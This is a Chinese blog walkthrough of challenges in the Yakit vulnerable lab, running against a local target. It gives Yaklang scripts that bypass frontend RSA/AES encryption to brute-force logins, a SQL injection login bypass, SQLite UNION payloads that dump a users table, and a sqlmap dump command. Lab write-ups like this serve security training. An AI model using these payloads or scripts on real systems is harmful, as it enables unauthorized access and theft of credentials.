<p><a href="https://www.freebuf.com/vuls/391476.html" target="_blank" rel="noopener nofollow">从前端验签与加解密学习Yakit中WebFuzzer热加载</a>。在这篇文章中学到了可以使用序列，将前两个序列提取到的key和数据，在第三个序列当做请求内容，解密后发送过去，这样也算是一种变相的完成了解密，但是这个方法感觉不太优雅，需要多一个额外的请求包。</p>
<p>这是当时测试的图片：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020254918-1074643537.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020256340-298710569.png" alt="" loading="lazy"></p>
<p>然后在 Yak Project官方公众号的<a href="https://mp.weixin.qq.com/s/gMbbEV62XR5_QCACQwZnOw" target="_blank" rel="noopener nofollow">文章</a>中终于看到了一个函数，<code>mirrorHTTPFlow</code>可以解决这个问题，虽然不能直接替换响应包，但会出现在提取数据中。由于官方文档没有具体讲解这个函数，所以它的具体功能现在还不太清楚。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020258100-237551658.png" alt="" loading="lazy"></p>
<p>热加载代码：</p>
<pre><code class="language-yaklang">//加密函数
encrypt = (pemPublic, data) =&gt; {
    data = codec.RSAEncryptWithOAEP(pemPublic /*type: []byte*/, data)~
    data = codec.EncodeBase64(data)
    body = f`{"data":"${data}"}`
    return body
}

//分割参数的函数
splitParams = (params) =&gt; {
    pairs := params.SplitN("|", 2)
    return encrypt(pairs[0], pairs[1])
}

mirrorHTTPFlow = (req, rsp, params) =&gt; {
    // 获取私钥以解密响应数据
    pem = params.privateKey
    
    // 切割响应中的数据，作为 JSON 加载
    _, body = poc.Split(rsp)
    body = json.loads(body)
    
    // 解密data
    data = codec.DecodeBase64(body.data)~
    data = codec.RSADecryptWithOAEP(pem, data)~
    
    return string(data)
}
</code></pre>
<p>请求包格式：</p>
<pre><code class="language-http">POST /crypto/js/rsa/fromserver/response HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{{yak(splitParams|{{p(publicKey)}}|{"username":"admin","password":"123","age":"20"})}}
</code></pre>
<p>效果如下图，可以看到解密后的data出现在了提取内容中。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020303826-829682248.png" alt="" loading="lazy"></p>
<p>爆破成功，但是看不到请求的原始密码，由于太累了懒得解决这个问题，啥时候闲了再说吧。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020306376-1737534806.png" alt="" loading="lazy"></p>
<h1 id="十一前端rsa加密aes密钥服务器传输">十一、前端RSA加密AES密钥，服务器传输</h1>
<p>本文作者هوCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<p>由于RSA加解密有长度限制，以及解密速度等问题，所以如https等协议都是用非对称加密对称加密的密钥，然后用对称加密算法来加密数据。本关卡就是用RSA来加密AES的key和iv，用AES来加密表单数据。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222170105783-1148170334.png" alt="" loading="lazy"></p>
<h2 id="分析-5">分析</h2>
<p>直接Submit，观察数据包发现请求包和响应包AES加密的key和iv都被加密了。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222170107577-154713823.png" alt="" loading="lazy"></p>
<p>查看源码，RSA的key是通过请求<code>/crypto/js/rsa/generator</code>路径获取的</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222170110492-222150812.png" alt="" loading="lazy"></p>
<p>AES的加密方法为AES-GCM</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222170114079-1308822503.png" alt="" loading="lazy"></p>
<p>流程图如下：</p>
<div class="mermaid">graph TD;
    A[开始] --&gt; B(加载页面);
    B --&gt; C{获取RSA密钥对};
    C -- 是 --&gt; D(从服务器获取公钥和私钥);
    D --&gt; E(将PEM格式的公钥和私钥转换为CryptoKey对象);
    E --&gt; F(生成随机AES密钥与IV);
    F --&gt; G(使用RSA-OAEP加密AES密钥与IV);
    G --&gt; H(使用Encrypt函数用AES-GCM方式加密提交的数据);
    H --&gt; I(发送加密数据到服务器);
    I --&gt; J(接收服务器响应);
    J --&gt; K(使用Decrypt函数用RSA与AES-GCM解密接收的数据);
    K --&gt; L(显示解密后的数据);
</div><h2 id="序列热加载-2">序列+热加载</h2>
<p>本文和上一关遇到一样的问题，本来打算用第三个请求来解密响应包的，最后选择了使用<code>mirrorHTTPFlow</code>函数来解密。</p>
<p>上一关中只能看到登陆成功，但不知道账号密码是什么。这次写了个解密函数解密请求包，不管怎么说，能跑就行。</p>
<p>热加载代码如下：</p>
<pre><code class="language-yaklang">// RSA-OAEP 加密
rsaEncrypt = (pem, data) =&gt; {
    data = codec.RSAEncryptWithOAEP(pem, data)~
    data = codec.EncodeBase64(data)
    return data
}
// AES-GCM 加密
aesEncrypt = (key, iv, data) =&gt; {
    encryptedData = codec.AESGCMEncryptWithNonceSize12(key, data, iv)~
    encryptedData = codec.EncodeBase64(encryptedData)
    return encryptedData
}
// 分割参数的函数
splitParams = (params) =&gt; {
    pairs := params.SplitN("|", 2)
    return pairs
}
// 主函数
encrypt = (params) =&gt; {
    pairs := splitParams(params)
    key =  randstr(16)
    iv = randstr(12)
    data = aesEncrypt(key, iv, pairs[1])
    encryptIV = rsaEncrypt(pairs[0], iv)
    encryptKey = rsaEncrypt(pairs[0], key)

    body = f`{"data":"${data}","iv":"${iv}","encryptedIV":"${encryptIV}","encryptedKey":"${encryptKey}"}`
    return body
}
// 解密函数
mirrorHTTPFlow = (req, rsp, params) =&gt; {
    // 获取私钥
    pem = params.privateKey
    
    // 切割响应中的数据，作为 JSON 加载
    body = json.loads(poc.GetHTTPPacketBody(rsp))
    
    // 提取 IV、KEY 和 DATA
    data = body.data
    iv = body.encryptedIV
    key = body.encryptedKey
    
    // 使用 RSA-OAEP 解密 IV 和 KEY
    iv = codec.RSADecryptWithOAEP(pem, codec.DecodeBase64(iv)~)~
    key = codec.RSADecryptWithOAEP(pem, codec.DecodeBase64(key)~)~
    
    // 使用 AES-GCM 解密
    data = codec.AESGCMDecryptWithNonceSize12(key, codec.DecodeBase64(data)~, iv)~
    return string(data)
}
</code></pre>
<p>使用Yakit的序列功能，效果如下，在提取数据中显示了未加密的请求和响应的内容：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222170118907-837751206.png" alt="" loading="lazy"></p>
<p>爆破效果：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222170121264-354581416.png" alt="" loading="lazy"></p>
<h1 id="十二sql-注入从登陆到-dump-数据库">十二、SQL 注入（从登陆到 Dump 数据库）</h1>
<p>本文作者คือCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="登录">登录</h2>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174649522-1108163498.png" alt="" loading="lazy"></p>
<p>输入账号密码，抓包查看数据包，看上去就是一个普通的aes加密:</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174651133-1397250929.png" alt="" loading="lazy"></p>
<p>这里热加载代码不算太难，常规的加解密函数就可以了：</p>
<pre><code class="language-yaklang">encryptAES = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)
    // 生成随机key和iv
    key =  randstr(16)
    iv = randstr(12)
    // 加密数据
    data = codec.AESCBCEncrypt(key /*type: []byte*/, body, iv /*type: []byte*/)~
    data = codec.EncodeBase64(data)
    // 获取key和iv的hex值
    hexKey = codec.EncodeToHex(key)
    hexIV = codec.EncodeToHex(iv)
    // 构造新的body
    body = f`{"key": "${hexKey}","iv": "${hexIV}","message": "${data}"}`

    return poc.ReplaceBody(packet, body, false)
}

decryptAES = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)
    body = json.loads(body)
    key = codec.DecodeHex(body.key)~
    iv = codec.DecodeHex(body.iv)~
    data = codec.DecodeBase64(body.message)~
    data = codec.AESCBCDecrypt(key, data, iv)~
    return poc.ReplaceBody(packet, data, false)
}

beforeRequest = func(req){
    return encryptAES(req)
}
afterRequest = func(rsp){
    return decryptAES(rsp)
}
</code></pre>
<p>请求体格式</p>
<pre><code class="language-json">{"username":"admin","password":"password"}
</code></pre>
<p>热加载加解密成功</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174705787-2068326505.png" alt="" loading="lazy"></p>
<p>本关提示是SQL注入，所以直接啪一个1=1，说时迟那时快，直接登陆成功</p>
<pre><code class="language-http">POST /crypto/sqli/aes-ecb/encrypt/login HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{"username":"admin","password":"password'or 1=1--"}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174708984-532270764.png" alt="" loading="lazy"></p>
<h2 id="注入">注入</h2>
<h3 id="手工">手工</h3>
<p>登陆后看到请求了<code>/crypto/sqli/aes-ecb/encrypt/query/users</code>路径<br>
<img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174717030-1248920885.png" alt="" loading="lazy"></p>
<p>解密一下请求包：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174720155-1508659664.png" alt="" loading="lazy"></p>
<p>获取到请求的格式：</p>
<pre><code class="language-json">{"search":""}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174723767-2076971252.png" alt="" loading="lazy"></p>
<p>这里是SQLite注入，注入的语句是通过这篇文章获取的：<a href="https://xz.aliyun.com/t/8627" target="_blank" rel="noopener nofollow">sqlite注入的一点总结 - 先知社区 (aliyun.com)</a></p>
<pre><code class="language-json">{"search":"user1'order by 3--"}
</code></pre>
<pre><code class="language-json">{"search":"user1'union select 1,2,3--"}
</code></pre>
<pre><code class="language-json">{"search":"user1'union select 11,22,sql from sqlite_master--"}
</code></pre>
<pre><code class="language-json">{"search":"user1'union select 11,22,sql from sqlite_master where type='table' and name='vulin_users'--"}
</code></pre>
<pre><code class="language-json">{"search":"user1'union select username,password,id from vulin_users--"}
</code></pre>
<p>注入成功：</p>
<pre><code class="language-http">POST /crypto/sqli/aes-ecb/encrypt/query/users HTTP/1.1
Host: 127.0.0.1:8787
Cookie: token=PLNqoZMZfiELLLFuTbmOtSrDdnpFmDDM
Content-Type: application/json
Content-Length: 119

{"search":"user1'union select username,password,id from vulin_users--"}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174730943-448657941.png" alt="" loading="lazy"></p>
<h3 id="sqlmap-1">sqlmap</h3>
<p>在MITM处加载热加载代码</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174733181-1784897463.png" alt="" loading="lazy"></p>
<p>使用sqlmap注入</p>
<pre><code>python .\sqlmap.py -r .\http.txt --proxy=http://127.0.0.1:8081 --batch -dbms=sqlite -T vulin_users -C username,password,role --dump
</code></pre>
<p>http.txt</p>
<pre><code class="language-http">POST /crypto/sqli/aes-ecb/encrypt/query/users HTTP/1.1
Host: 127.0.0.1:8787
Cookie: token=PLNqoZMZfiELLLFuTbmOtSrDdnpFmDDM
Content-Type: application/json
Content-Length: 119

{"search":"*"}
</code></pre>
<p>效果：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222174737032-281899828.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.2774430821863426" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2024-12-23 08:19">2024-12-23 08:19</span>&nbsp;
<a href="https://www.cnblogs.com/CVE-Lemon">CVE-柠檬i</a>&nbsp;
阅读(<span id="post_view_count">15</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18622394" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18622394);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18622394', targetLink: 'https://www.cnblogs.com/CVE-Lemon/p/18622394', title: 'Yakit靶场-高级前端加解密与验签实战-全关卡通关教程' })">举报</a>
</div>
        